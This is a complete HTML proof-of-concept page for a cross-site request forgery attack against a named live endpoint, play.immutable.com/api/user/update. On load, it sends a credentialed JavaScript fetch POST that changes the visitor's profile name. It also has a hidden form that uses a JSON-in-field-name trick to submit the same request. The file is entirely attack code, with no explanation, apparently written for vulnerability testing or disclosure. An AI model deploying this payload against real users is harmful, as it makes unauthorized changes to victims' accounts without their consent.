<!-- csrf-poc.html -->
<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF PoC</h1>

    <form id="csrfForm" action="https://play.immutable.com/api/user/update" method="POST" enctype="application/json">
      <input type="hidden" name='{"name":"CSRF✅"}'>
      <input type="submit" value="Submit CSRF">
    </form>

    <script>
      // Автоматическая отправка (если работает без JS-блокировок)
      fetch("https://play.immutable.com/api/user/update", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          name: "CSRF ✅"
        }),
        credentials: "include"
      });
    </script>
  </body>
</html>
